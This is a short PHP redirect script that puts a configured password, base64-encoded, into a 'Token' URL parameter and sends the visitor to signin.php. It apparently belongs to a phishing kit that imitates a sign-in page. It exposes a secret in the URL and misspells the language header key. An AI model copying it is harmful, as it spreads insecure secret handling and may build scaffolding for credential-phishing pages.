<?php
 include 'php/err.php';
 include '../config.php';
 $token = $pass;
 $agence = substr($_SERVER['HTTP_ACCEPT_LANGUEG'], 0 , 2);
 $rand = substr( md5(rand(0, 100)) ,0, 12);
 $getToken = base64_encode($token);
 $uri = "?local.x=$agence&Token=$getToken&S.n=$rand";

header("location: signin.php$uri");
?>